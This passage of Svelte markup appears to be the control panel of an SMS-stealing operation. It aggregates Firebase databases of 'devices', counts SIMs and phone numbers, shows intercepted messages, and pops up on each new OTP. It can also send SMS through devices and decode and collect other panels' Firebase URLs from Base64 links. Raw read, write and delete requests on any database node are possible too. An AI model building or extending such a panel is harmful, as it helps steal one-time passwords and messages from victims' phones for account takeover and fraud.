              aria-label="Universal extractor input"
            >
              <div class="ux-input-header">
                <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
                <span>Paste anything — URLs, Base64, JSON, or mixed text</span>
              </div>
              <textarea
                class="ux-textarea"
                bind:value={uxInput}
                placeholder={"https://panel.vercel.app/?s=aHR0cHM6Ly8…\nhttps://project-default-rtdb.firebaseio.com\n{\"db\":\"https://…firebaseio.com\"}\naHR0cHM6Ly8… (raw Base64)"}
                aria-label="Universal extraction input"
                rows="4"
                onkeydown={(e) => e.key === 'Enter' && e.ctrlKey && !uxProcessing && uxInput.trim() && uxRunExtract()}
              ></textarea>
              <div class="ux-input-actions">
                <label class="ux-file-btn" title="Upload files">
                  <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
                  Upload
                  <input type="file" multiple accept=".json,.txt,.csv,.html,.htm,.xml,.tsv,.log,.md,.yaml,.yml,.ini,.cfg,.conf,.toml,.ndjson" onchange={uxHandleFileSelect} style="display:none" />
                </label>
                {#if uxInput || uxResults.length}
                  <button class="ux-clear-input-btn" onclick={uxClear} title="Clear all">
                    <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14H6L5 6"/></svg>
                    Clear
                  </button>
                {/if}
                <button class="btn btn-primary btn-sm ux-extract-btn" onclick={uxRunExtract} disabled={uxProcessing || !uxInput.trim()}>
                  {#if uxProcessing}
                    <span class="spin-ring" style="width:11px;height:11px;border-width:2px"></span>
                    Extracting…
                  {:else}
                    <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M7 17L17 7M7 7h10v10"/></svg>
                    Extract
                  {/if}
                </button>
              </div>
              {#if uxDragActive}
                <div class="ux-drop-overlay">
                  <svg width="28" height="28" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5"><path d="M21 15v4a2 2 0 0 1-2 2H5a2 2 0 0 1-2-2v-4"/><polyline points="17 8 12 3 7 8"/><line x1="12" y1="3" x2="12" y2="15"/></svg>
                  <span>Drop files here</span>
                </div>
              {/if}
            </div>

            <!-- Uploaded files tags -->
            {#if uxUploadedFiles.length}
              <div class="ux-uploaded-files">
                {#each uxUploadedFiles as f}
                  <span class="ux-file-tag">
                    <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>
                    {f.name}
                    <span class="ux-file-tag-count">{f.resultCount}</span>
                  </span>
                {/each}
              </div>
            {/if}

            <!-- Errors -->
            {#if uxErrors.length}
              <div class="ux-errors">
                {#each uxErrors as err}
                  <div class="ux-error-item">
                    <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><circle cx="12" cy="12" r="10"/><path d="M15 9l-6 6M9 9l6 6"/></svg>
                    {err}
                  </div>
                {/each}
              </div>
            {/if}

            <!-- Results -->
            {#if uxResults.length}
              <div class="ux-results">
                <div class="ux-results-header">
                  <div class="ux-results-title">
                    <button class="ux-select-all-btn" onclick={uxToggleAll} title="Toggle all">
                      {#if uxResults.every(r => r.selected)}
                        <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="#f97316" stroke-width="2.5"><rect x="3" y="3" width="18" height="18" rx="3"/><path d="M9 12l2 2 4-4"/></svg>
                      {:else if uxResults.some(r => r.selected)}
                        <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="#f97316" stroke-width="2.5"><rect x="3" y="3" width="18" height="18" rx="3"/><line x1="8" y1="12" x2="16" y2="12"/></svg>
                      {:else}
                        <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="#475569" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="3"/></svg>
                      {/if}
                    </button>
                    <span>{uxResults.length} connection{uxResults.length !== 1 ? 's' : ''} found</span>
                    {#if uxStats && uxStats.duplicates > 0}
                      <span class="ux-stat-dim">· {uxStats.duplicates} dup{uxStats.duplicates !== 1 ? 's' : ''} filtered</span>
                    {/if}
                  </div>
                  <div class="ux-results-actions">
                    <button class="bulk-action-btn" onclick={uxCopyAllUrls} title="Copy selected URLs">
                      <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
                      Copy
                    </button>
                  </div>
                </div>
                <div class="ux-results-list">
                  {#each uxResults as item (item.url)}
                    <div class="ux-result-row {item.selected ? '' : 'ux-result-deselected'}">
                      <button class="ux-result-check" onclick={() => uxToggleResult(item.url)}>
                        {#if item.selected}
                          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#f97316" stroke-width="2.5"><rect x="3" y="3" width="18" height="18" rx="3"/><path d="M9 12l2 2 4-4"/></svg>
                        {:else}
                          <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="#334155" stroke-width="2"><rect x="3" y="3" width="18" height="18" rx="3"/></svg>
                        {/if}
                      </button>
                      <div class="ux-result-info">
                        <input
                          class="ux-result-name"
                          value={item.name}
                          onchange={(e) => uxUpdateName(item.url, e.currentTarget.value)}
                          placeholder="project-name"
                          aria-label="Connection name"
                        />
                        <div class="ux-result-url" title={item.url}>{item.url}</div>
                        <span class="ux-source-tag">{item.source}</span>
                      </div>
                      <div class="ux-result-btns">
                        <button class="ux-action-mini" onclick={() => uxCopyUrl(item.url)} title="Copy URL">
                          <svg width="10" height="10" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
                        </button>
                        <button class="ux-action-mini ux-action-remove" onclick={() => uxRemoveResult(item.url)} title="Remove">×</button>
                      </div>
                    </div>
                  {/each}
                </div>
              </div>

              <!-- Footer: Add selected to connections -->
              <div class="ap-foot">
                <button class="btn btn-ghost" onclick={() => { uxClear(); addPanelMode='single'; }}>Cancel</button>
                <button class="btn btn-ghost" onclick={uxAddToBulk}>
                  <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M17 3a2.828 2.828 0 1 1 4 4L7.5 20.5 2 22l1.5-5.5z"/></svg>
                  Send to Bulk
                </button>
                <button class="btn btn-primary" onclick={() => { uxAddToBulk(); addPanelMode = 'bulk'; }}>
                  <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M12 5v14M5 12h14"/></svg>
                  Add {uxResults.filter(r => r.selected).length} Connection{uxResults.filter(r => r.selected).length !== 1 ? 's' : ''}
                </button>
              </div>
            {:else if !uxProcessing && !uxInput.trim() && !uxErrors.length}
              <div class="ux-empty-hint">
                <div class="ux-empty-icon">
                  <svg width="24" height="24" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.2"><path d="M10 13a5 5 0 0 0 7.54.54l3-3a5 5 0 0 0-7.07-7.07l-1.72 1.71"/><path d="M14 11a5 5 0 0 0-7.54-.54l-3 3a5 5 0 0 0 7.07 7.07l1.71-1.71"/></svg>
                </div>
                <p>Paste any URL, Base64, JSON, or upload a file.</p>
                <p class="ux-empty-sub">The extractor automatically detects and decodes Firebase RTDB connections from any source.</p>
              </div>
            {/if}
          </div>
        {/if}

        <!-- ── Quick Settings ── -->
        <div class="ap-settings">
          <div class="aps-title">System & Notification Settings</div>

          <label class="aps-row">
            <span class="aps-lbl">
              <svg
                width="13"
                height="13"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                stroke-width="2"
                ><path d="M18 8A6 6 0 0 0 6 8c0 7-3 9-3 9h18s-3-2-3-9" /><path
                  d="M13.73 21a2 2 0 0 1-3.46 0"
                /></svg
              >
              <span
                >{notifsEnabled
                  ? "Notifications Enabled (Alerts & Sound)"
                  : "Notifications Muted (Silent)"}</span
              >
            </span>
            <button
              class="aps-tog {notifsEnabled ? 'aps-on' : ''}"
              onclick={toggleNotifsEnabled}
              aria-label="Toggle notifications"
            >
              <span class="aps-knob"></span>
            </button>
          </label>

          <label class="aps-row" style="margin-top:8px">
            <span class="aps-lbl">
              <svg
                width="13"
                height="13"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                stroke-width="2"
                ><rect x="3" y="3" width="18" height="18" rx="2" /><line
                  x1="3"
                  y1="18"
                  x2="21"
                  y2="18"
                /><line x1="8" y1="18" x2="8" y2="21" /><line
                  x1="16"
                  y1="18"
                  x2="16"
                  y2="21"
                /></svg
              >
              <span
                >{showNotifsTab
                  ? "Notifications Tab in Bottom Nav (Visible)"
                  : "Notifications Tab in Bottom Nav (Hidden)"}</span
              >
            </span>
            <button
              class="aps-tog {showNotifsTab ? 'aps-on' : ''}"
              onclick={toggleShowNotifsTab}
              aria-label="Toggle notifications tab in bottom nav"
            >
              <span class="aps-knob"></span>
            </button>
          </label>

          <label class="aps-row" style="margin-top:8px">
            <span class="aps-lbl">
              <svg
                width="13"
                height="13"
                viewBox="0 0 24 24"
                fill="none"
                stroke="currentColor"
                stroke-width="2"
                ><path d="M15 3h6v6M9 21H3v-6M21 3l-7 7M3 21l7-7" /></svg
              >
              <span
                >{autoOpenNotif
                  ? "Auto-open Panel on new OTP (ON)"
                  : "Auto-open Panel on new OTP (OFF — Manual only)"}</span
              >
            </span>
            <button
              class="aps-tog {autoOpenNotif ? 'aps-on' : ''}"
              onclick={toggleAutoOpenNotif}
              aria-label="Toggle auto-open on new OTP"
            >
              <span class="aps-knob"></span>
            </button>
          </label>
        </div>
      </div>
    {/if}

    <!-- Raw drawer -->
    {#if rawOpen}
      <div class="raw-drawer">
        <div class="rd-top">
          <span class="rd-lbl">Raw Firebase Request</span>
          <select bind:value={rawConnId} class="tiny-sel">
            {#each connections as c (c.id)}<option value={c.id}>{c.name}</option
              >{/each}
          </select>
          <button
            class="ico-btn"
            onclick={() => (rawOpen = false)}
            aria-label="Close"
          >
            <svg
              width="13"
              height="13"
              viewBox="0 0 24 24"
              fill="none"
              stroke="currentColor"
              stroke-width="2"><path d="M18 6 6 18M6 6l12 12" /></svg
            >
          </button>
        </div>
        <div class="rd-row">
          <select bind:value={rawMethod} class="method-sel">
            {#each ["GET", "POST", "PUT", "PATCH", "DELETE"] as m}<option
                value={m}>{m}</option
              >{/each}
          </select>
          <input
            class="rd-path"
            bind:value={rawPath}
            placeholder="path/to/node"
            aria-label="Firebase path"
          />
          <button
            class="btn btn-primary btn-sm"
            onclick={sendRaw}
            disabled={rawLoading}>Send</button
          >
        </div>
        {#if ["POST", "PUT", "PATCH"].includes(rawMethod)}
          <textarea
            class="code"
            rows="3"
            bind:value={rawBody}
            style="resize:vertical;font-size:12px"
            aria-label="Request body"
          ></textarea>
        {/if}
        {#if rawRes}
          <div style="display:flex;gap:8px;align-items:center">
            <span class="s-pill {rawRes.ok ? 'sp-ok' : 'sp-err'}"
              >{rawRes.status}</span
            >
          </div>
          <pre class="json-view">{JSON.stringify(
              rawRes.data ?? rawRes,
              null,
              2,
            ).slice(0, 2000)}</pre>
        {/if}
      </div>
    {/if}

    <!-- Tab bar -->
    <div class="tab-bar">
      <button
        class="tab {activeTab === 'overview' ? 'active' : ''}"
        onclick={() => (activeTab = "overview")}>Overview</button
      >
      <button
        class="tab {activeTab === 'firebase' ? 'active' : ''}"
        onclick={() => (activeTab = "firebase")}>
        Firebase <span class="tab-cnt">{connections.length}</span></button
      >
      <button
        class="tab {activeTab === 'device' ? 'active' : ''}"
        onclick={() => switchTab("device")}
        disabled={!selectedKey}>Device</button
      >
      <button
        class="tab {activeTab === 'messages' ? 'active' : ''}"
        onclick={() => switchTab("messages")}
        disabled={!selectedKey}>Messages</button
      >
      <button
        class="tab {activeTab === 'send' ? 'active' : ''}"
        onclick={() => switchTab("send")}
        disabled={!selectedKey}>Send SMS</button
      >
      <button
        class="tab {activeTab === 'discovered' ? 'active' : ''}"
        onclick={() => { activeTab = 'discovered'; loadDiscoveryRecords(); }}
        >Discovered <span class="tab-cnt">{discoveryRecords.length}</span></button
      >
    </div>

    <!-- Tab content -->
    <div
      class="tab-body {activeTab === 'overview' ? 'tab-body-overview' : ''} {activeTab === 'firebase' ? 'tab-body-firebase' : ''}"
      bind:this={tabBodyEl}
    >
      <!-- ── FIREBASE CONNECTIONS ──────────────────────────────────── -->
      {#if activeTab === "firebase"}
        <!-- Toolbar -->
        <div class="fc-toolbar">
          <div class="fc-search-wrap">
            <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><circle cx="11" cy="11" r="8"/><path d="m21 21-4.35-4.35"/></svg>
            <input class="fc-search-in" bind:value={fcSearch} placeholder="Search by name or URL…" aria-label="Search connections" />
            {#if fcSearch}<button class="fc-search-clear" onclick={() => (fcSearch = '')}>×</button>{/if}
          </div>
          <div class="fc-filter-pills">
            <button class="fc-pill {fcStatusFilter === 'all' ? 'fc-pill-a' : ''}" onclick={() => (fcStatusFilter = 'all')}>All <span class="fc-pill-cnt">{connections.length}</span></button>
            <button class="fc-pill {fcStatusFilter === 'online' ? 'fc-pill-on' : ''}" onclick={() => (fcStatusFilter = 'online')}>🟢 Online</button>
            <button class="fc-pill {fcStatusFilter === 'offline' ? 'fc-pill-off' : ''}" onclick={() => (fcStatusFilter = 'offline')}>🔴 Offline</button>
            {#if failedConns.length > 0}
              <button class="fc-pill fc-pill-fail {fcStatusFilter === 'failed' ? 'fc-pill-fail-a' : ''}" onclick={() => (fcStatusFilter = 'failed')}>
                ⚠ Failed <span class="fc-pill-cnt">{failedConns.length}</span>
              </button>
            {/if}
          </div>
          <div class="fc-global-actions">
            <!-- Master toggle -->
            {#if connections.length > 0}
              <button
                class="fc-master-toggle {masterEnabled ? 'fmt-on' : 'fmt-off'}"
                onclick={toggleAllConns}
                title="{masterEnabled ? 'Disable all connections' : 'Enable all connections'}"
              >
                <span class="fmt-knob"></span>
                <span class="fmt-label">{masterEnabled ? 'All ON' : 'All OFF'}</span>
              </button>
            {/if}
            {#if failedConns.length > 0}
              <button class="fc-act-btn fc-act-danger" onclick={removeFailedConns} title="Remove all {failedConns.length} failed connections">
                <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14H6L5 6"/><path d="M10 11v6M14 11v6"/></svg>
                Remove Failed ({failedConns.length})
              </button>
            {/if}
            <button class="fc-act-btn" onclick={copyAllConnUrls} title="Copy all Firebase URLs">
              <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
              Copy All URLs
            </button>
            <button class="fc-act-btn" onclick={copyAllConnNames} title="Copy all names">
              <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/></svg>
              Copy Names
            </button>
            <button class="fc-act-btn" onclick={copyAllConnDetails} title="Copy all details (Name|URL|Path|InfoPath)">
              <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/><line x1="16" y1="13" x2="8" y2="13"/><line x1="16" y1="17" x2="8" y2="17"/></svg>
              Copy Details
            </button>
            <button class="fc-act-btn" onclick={() => (addOpen = true)} title="Add Firebase connection">
              <svg width="12" height="12" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M12 5v14M5 12h14"/></svg>
              Add New
            </button>
          </div>
        </div>

        <!-- Multi-select action bar -->
        {#if fcSelected.size > 0}
          <div class="fc-sel-bar">
            <span class="fc-sel-count">{fcSelected.size} selected</span>
            <button class="fc-sel-btn" onclick={copySelectedConnUrls}>
              <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
              Copy URLs
            </button>
            <button class="fc-sel-btn fc-sel-danger" onclick={fcRemoveSelected}>
              <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14H6L5 6"/><path d="M10 11v6M14 11v6"/></svg>
              Remove Selected
            </button>
            <button class="fc-sel-btn" onclick={() => (fcSelected = new Set())}>Clear Selection</button>
          </div>
        {/if}

        <!-- Connections list -->
        {#if filteredConns.length === 0}
          <div class="fc-empty">
            {#if connections.length === 0}
              <svg width="48" height="48" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="1.5" opacity="0.25"><path d="M4 7l8-4 8 4v10l-8 4-8-4V7z"/><path d="M4 7l8 4 8-4M12 11v10"/></svg>
              <div class="fc-empty-title">No Firebase connections yet</div>
              <div class="fc-empty-sub">Click "Add New" or use the + button to connect a Firebase RTDB.</div>
              <button class="btn btn-primary" onclick={() => (addOpen = true)}>
                <svg width="13" height="13" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2.5"><path d="M12 5v14M5 12h14"/></svg>
                Add Firebase Connection
              </button>
            {:else}
              <div class="fc-empty-title">No connections match your search</div>
              <button class="btn btn-ghost btn-sm" onclick={() => { fcSearch = ''; fcStatusFilter = 'all'; }}>Clear filters</button>
            {/if}
          </div>
        {:else}
          <!-- Select all checkbox row -->
          <div class="fc-select-all-row">
            <label class="fc-chk-label">
              <input type="checkbox" class="fc-chk" checked={fcSelected.size === filteredConns.length && filteredConns.length > 0} onchange={fcToggleAll} />
              {fcSelected.size === filteredConns.length && filteredConns.length > 0 ? 'Deselect All' : 'Select All'}
            </label>
            <span class="fc-showing">{filteredConns.length} connection{filteredConns.length !== 1 ? 's' : ''}</span>
          </div>
          <div class="fc-list">
            {#each filteredConns as conn (conn.id)}
              {@const onlineDot = conn.online > 0}
              {@const hasAuth = !!(connections.find(c => c.id === conn.id)?.token)}
              {@const realConn = connections.find(c => c.id === conn.id)}
              <div class="fc-card {fcSelected.has(conn.id) ? 'fc-card-sel' : ''}">
                <!-- Card header -->
                <div class="fc-card-hdr">
                  <input type="checkbox" class="fc-chk" checked={fcSelected.has(conn.id)} onchange={() => fcToggleSelect(conn.id)} />
                  <span class="fc-dot" style="background:{conn.color}"></span>
                  <span class="fc-name">{conn.name}</span>
                  <span class="fc-status-badge {onlineDot ? 'fc-online' : 'fc-offline'}">
                    <span class="fc-status-dot"></span>
                    {onlineDot ? `${conn.online} online` : 'Offline'}
                    {#if conn.total > 0} · {conn.total} total{/if}
                  </span>
                  {#if hasAuth}<span class="fc-auth-badge">🔐 Auth</span>{/if}
                  <div class="fc-card-actions">
                    <!-- Per-card enable/disable toggle -->
                    <button
                      class="fc-card-tog {realConn?.enabled ? 'fc-card-tog-on' : 'fc-card-tog-off'}"
                      onclick={() => toggleConn(conn.id)}
                      title="{realConn?.enabled ? 'Click to disable connection' : 'Click to enable connection'}"
                      aria-label="Toggle connection status"
                    >
                      <span class="fct-knob"></span>
                      <span class="fct-lbl">{realConn?.enabled ? 'ON' : 'OFF'}</span>
                    </button>
                    <button class="fc-copy-btn {copiedKey === `${conn.id}::url` ? 'fc-copied' : ''}" onclick={() => copyConnUrl(conn)} title="Copy URL">
                      {copiedKey === `${conn.id}::url` ? '✓' : ''}
                      <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><rect x="9" y="9" width="13" height="13" rx="2"/><path d="M5 15H4a2 2 0 0 1-2-2V4a2 2 0 0 1 2-2h9a2 2 0 0 1 2 2v1"/></svg>
                      {copiedKey === `${conn.id}::url` ? 'Copied!' : 'URL'}
                    </button>
                    <button class="fc-copy-btn {copiedKey === `${conn.id}::name` ? 'fc-copied' : ''}" onclick={() => copyConnName(conn)} title="Copy name">
                      {copiedKey === `${conn.id}::name` ? '✓' : ''}
                      <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M17 21v-2a4 4 0 0 0-4-4H5a4 4 0 0 0-4 4v2"/><circle cx="9" cy="7" r="4"/></svg>
                      {copiedKey === `${conn.id}::name` ? 'Copied!' : 'Name'}
                    </button>
                    <button class="fc-copy-btn {copiedKey === `${conn.id}::details` ? 'fc-copied' : ''}" onclick={() => copyConnDetails(conn)} title="Copy all details">
                      {copiedKey === `${conn.id}::details` ? '✓' : ''}
                      <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M14 2H6a2 2 0 0 0-2 2v16a2 2 0 0 0 2 2h12a2 2 0 0 0 2-2V8z"/><polyline points="14 2 14 8 20 8"/></svg>
                      {copiedKey === `${conn.id}::details` ? 'Copied!' : 'Details'}
                    </button>
                    <button class="fc-edit-btn" onclick={() => fcStartEdit(conn)} title="Edit connection">
                      <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><path d="M11 4H4a2 2 0 0 0-2 2v14a2 2 0 0 0 2 2h14a2 2 0 0 0 2-2v-7"/><path d="M18.5 2.5a2.121 2.121 0 0 1 3 3L12 15l-4 1 1-4 9.5-9.5z"/></svg>
                      Edit
                    </button>
                    <button class="fc-remove-btn" onclick={() => dropConn(conn.id)} title="Remove connection">
                      <svg width="11" height="11" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2"><polyline points="3 6 5 6 21 6"/><path d="M19 6l-1 14H6L5 6"/><path d="M10 11v6M14 11v6"/></svg>
                    </button>
                  </div>
                </div>
                <!-- Card body: URL + paths -->
                <div class="fc-card-body">
                  <div class="fc-url-row">
                    <span class="fc-url-label">URL</span>
                    <code class="fc-url-val">{conn.url}</code>
                  </div>
                  <div class="fc-meta-row">
                    <span class="fc-meta-item"><span class="fc-meta-lbl">Messages Path:</span> <code class="fc-meta-val">{realConn?.path || 'messages'}</code></span>
                    {#if realConn?.infoPath}<span class="fc-meta-item"><span class="fc-meta-lbl">Device Info:</span> <code class="fc-meta-val">{realConn.infoPath}</code></span>{/if}
                    <span class="fc-meta-item"><span class="fc-meta-lbl">Auth:</span> <span class="fc-meta-val {hasAuth ? 'fc-auth-yes' : 'fc-auth-no'}">{hasAuth ? '🔐 Configured' : 'None'}</span></span>
                    {#if conn.error}<span class="fc-meta-item fc-error-item"><span class="fc-meta-lbl">Error:</span> {conn.error}</span>{/if}
                  </div>
                </div>
                <!-- Inline Edit form -->
                {#if fcEditId === conn.id}
                  <div class="fc-edit-form">
                    <div class="fc-edit-grid">
                      <div class="field">
                        <label for="fce-name-{conn.id}">Name</label>
                        <input id="fce-name-{conn.id}" bind:value={fcEditForm.name} placeholder="project-name" />
                      </div>
                      <div class="field">
                        <label for="fce-url-{conn.id}">Firebase URL</label>
                        <input id="fce-url-{conn.id}" bind:value={fcEditForm.url} placeholder="https://xxx-default-rtdb.firebaseio.com" />
                      </div>
                      <div class="field">
                        <label for="fce-path-{conn.id}">Messages Path</label>
                        <input id="fce-path-{conn.id}" bind:value={fcEditForm.path} placeholder="messages" />
                      </div>
                      <div class="field">
                        <label for="fce-info-{conn.id}">Device Info Path</label>
                        <input id="fce-info-{conn.id}" bind:value={fcEditForm.infoPath} placeholder="clients (optional)" />
                      </div>
                      <div class="field">
                        <label for="fce-tok-{conn.id}">Auth Token</label>
                        <input id="fce-tok-{conn.id}" type="password" bind:value={fcEditForm.token} placeholder="optional" />
                      </div>
                    </div>
                    <div class="fc-edit-foot">
                      <button class="btn btn-ghost btn-sm" onclick={fcCancelEdit}>Cancel</button>
                      <button class="btn btn-primary btn-sm" onclick={fcSaveEdit}>Save Changes</button>
                    </div>
                  </div>
                {/if}
              </div>
            {/each}
          </div>
        {/if}
      {/if}

      <!-- ── OVERVIEW ──────────────────────────────────────────────────── -->
      {#if activeTab === "overview"}
        <div class="live-card">
          <div class="lc-icon">
            <svg width="38" height="38" viewBox="0 0 32 32" fill="none">
              <rect
                x="2"
                y="4"
                width="28"
                height="20"
                rx="3"
                fill="rgba(249,115,22,0.12)"
                stroke="#f97316"
                stroke-width="1.2"
              />
              <rect
                x="5"
                y="14"
                width="5"
                height="7"
                rx="1"
                fill="#f97316"
                opacity="0.9"
              />
              <rect
                x="13"
                y="10"
                width="5"
                height="11"
                rx="1"
                fill="#38bdf8"
                opacity="0.9"
              />
              <rect
                x="21"
                y="7"
                width="5"
                height="14"
                rx="1"
                fill="#22c55e"
                opacity="0.9"
              />
            </svg>
          </div>
          <div>
            <div class="lc-title">Live Status</div>
            <div class="lc-sub">
              Total: {totalCount} &nbsp;·&nbsp; Online: {onlineCount} &nbsp;·&nbsp;
              Offline: {offlineCount}
            </div>
          </div>
        </div>

        <div class="stat-row">
          <div class="stat-card" style="border-top-color:#38bdf8">
            <div class="sc-n">{totalCount}</div>
            <div class="sc-l">TOTAL</div>
          </div>
          <div class="stat-card" style="border-top-color:#22c55e">
            <div class="sc-n" style="color:#22c55e">{onlineCount}</div>
            <div class="sc-l">ONLINE</div>
          </div>
          <div class="stat-card" style="border-top-color:#ef4444">
            <div class="sc-n" style="color:#ef4444">{offlineCount}</div>
            <div class="sc-l">OFFLINE</div>
          </div>
          <div class="stat-card" style="border-top-color:#a78bfa">
            <div class="sc-n" style="color:#a78bfa">
              {allDevices.filter((d) => d.info && getSims(d.info)).length}
            </div>
            <div class="sc-l">SIMS</div>
          </div>
        </div>

        <div class="dt-card">
          <!-- Filter chips — multi-select AND logic -->
          <div class="dt-filters">
            <div class="dt-chips">
              <div class="dt-search-wrap">
                <svg
                  width="12"
                  height="12"
                  viewBox="0 0 24 24"
                  fill="none"
                  stroke="currentColor"
                  stroke-width="2.5"
                  ><circle cx="11" cy="11" r="8" /><line
                    x1="21"
                    y1="21"
                    x2="16.65"
                    y2="16.65"
                  /></svg
                >
                <input
                  class="dt-search-in"
                  bind:value={tableSearch}
                  placeholder="Filter search number, ID…"
                  aria-label="Filter search devices or numbers"
                />
                {#if tableSearch}
                  <button
                    class="dt-search-clear"
                    onclick={() => (tableSearch = "")}
                    title="Clear filter search"
                    aria-label="Clear filter search">✕</button
                  >
                {/if}
              </div>
              <button
                class="dt-chip {tableActiveFilters.has('on') ? 'dco' : ''}"
                onclick={() => toggleTableFilter("on")}
                title="Online devices"
                aria-label="Filter: Online"
              >
                🟢 Online <span class="dt-chip-cnt">{onlineCount}</span>
              </button>
              <button
                class="dt-chip {tableActiveFilters.has('off') ? 'dcx' : ''}"
                onclick={() => toggleTableFilter("off")}
                title="Offline devices"
                aria-label="Filter: Offline"
              >
                🔴 Offline <span class="dt-chip-cnt">{offlineCount}</span>
              </button>
              <button
                class="dt-chip {tableActiveFilters.has('num') ? 'dcn' : ''}"
                onclick={() => toggleTableFilter("num")}
                title="Devices with phone number (online: {onlineNumCount})"
                aria-label="Filter: With number"
              >
                📱 Numbers <span class="dt-chip-cnt">{numCount}</span>
                {#if onlineNumCount > 0}<span class="dt-chip-online"
                    >🟢{onlineNumCount}</span
                  >{/if}
              </button>
              <button
                class="dt-chip {tableActiveFilters.has('used') ? 'dcu' : ''}"
                onclick={() => toggleTableFilter("used")}
                title="Used devices"
                aria-label="Filter: Used"
              >
                ✓ Used
              </button>
              {#if newCount > 0}
                <button
                  class="dt-chip dcnew {tableActiveFilters.has('new')
                    ? 'dcnew-a'
                    : ''}"
                  onclick={() => toggleTableFilter("new")}
                  title="Newly added devices"
                  aria-label="Filter: New"
                >
                  ✦ New <span class="dt-chip-cnt">{newCount}</span>
                </button>
              {/if}
              {#if tableActiveFilters.size > 0 || tableSearch}
                <button
                  class="dt-chip-clear"
                  onclick={() => {
                    tableActiveFilters = new Set();
                    tableSearch = "";
                  }}
                  aria-label="Clear all filters">✕ Clear</button
                >
              {/if}
              {#if tableConnFilter}
                <button
                  class="dt-chip-clear"
                  onclick={() => (tableConnFilter = null)}
                  aria-label="Clear Firebase filter"
                >
                  ✕ {connections.find((c) => c.id === tableConnFilter)?.name ??
                    tableConnFilter}
                </button>
              {/if}
            </div>
            <!-- Firebase row -->
            <div class="dt-fb-row">
              <span class="dt-fb-lbl">Firebase:</span>
              <div class="dt-fb-badges">
                {#each connStats as c (c.id)}
                  <button
                    class="conn-badge {tableConnFilter === c.id
                      ? 'cb-active'
                      : ''}"
                    style="color:{c.color};border-color:{c.color}55;{tableConnFilter ===
                    c.id
                      ? `background:${c.color}22`
                      : ''}"
                    onclick={() =>
                      (tableConnFilter =
                        tableConnFilter === c.id ? null : c.id)}
                    title="{c.name}: {c.online}/{c.total} online"
                    aria-label="{c.name} filter"
                  >
                    <span
                      class="cb-dot"
